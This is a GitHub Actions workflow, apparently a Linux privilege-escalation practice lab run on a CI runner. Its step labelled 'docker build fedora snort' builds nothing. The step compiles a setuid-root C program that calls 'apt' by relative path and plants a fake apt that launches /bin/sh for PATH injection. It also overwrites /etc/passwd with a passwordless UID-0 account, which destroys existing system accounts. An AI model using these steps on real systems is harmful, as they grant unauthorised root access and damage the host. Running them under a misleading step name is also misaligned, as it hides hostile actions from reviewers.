name: "openscap fedora  CI workflow"


on:
  push:
    branches: [ test ]


jobs:

  ubuntu-latest-fedora-openscap-job:
    name: "openscap fedora ubuntu-latest"
    runs-on: ubuntu-latest
    env:
      version: "latest"
      name: "fedora:openscap"
      dockerfilename: "Dockerfile.fedora.openscap"
    steps:
    - uses: actions/checkout@v2
    - name: "os fingerprinting"
      run: |
        hostnamectl status
        lsb_release -a
        lsb_release -d
        cat /etc/lsb-release
        cat /etc/issue
        cat /etc/os-release
        sudo apt-get install -y neofetch && neofetch 
    # - name: "docker build fedora snort"
    #   run: |
    #     # destroyed afterwards (use --rm )
    #     # all subsequent Dockerfile commands generate new images and the cache is not used
    #     sudo docker build --no-cache --rm  -t ${name} . --file dockerfiles/${dockerfilename}  
    #     docker image ls
    #     docker image history ${name}
    #     docker system df -v               
    #     docker image inspect ${name}     
    - name: "docker build fedora snort"
      run: |
        # destroyed afterwards (use --rm )
        # all subsequent Dockerfile commands generate new images and the cache is not used
        ls -lai
        # executed as root (Uid 0)
        stat /usr/bin/passwd
        ls -lai /usr/bin/passwd
        stat /etc/shadow
        ls -lai /etc/shadow
        # Finding vulnerable executables,files with setuid bit set
        # sudo find / -xdev -perm -4000 2>/dev/null
        #Path injection
        #when an executable refer to another one without using the full path to
        cat <<EOT | sudo tee apt-updater.c
        #include <stdlib.h>
        #include <unistd.h>

        int main() {
          setuid(0);

          system("apt update");
          system("apt upgrade -y");
          return 0;
        }
        EOT
        stat apt-updater.c
        ls -lai apt-updater.c
        mkdir /tmp/foo # create random directory to put the script
        echo /bin/sh > /tmp/foo/apt # create the script that will launch /bin/sh
        chmod 755 /tmp/foo/apt # mark it as executable
        # override the PATH variable to that it contains /tmp/foo directory 
        # & execute the vulnerable program
        # PATH=/tmp/foo:$PATH /usr/local/bin/apt-updater 
        whoami
        id # root?
        echo “runner::0:0:System Administrator:/root/root:/bin/bash” | sudo tee /etc/passwd
        id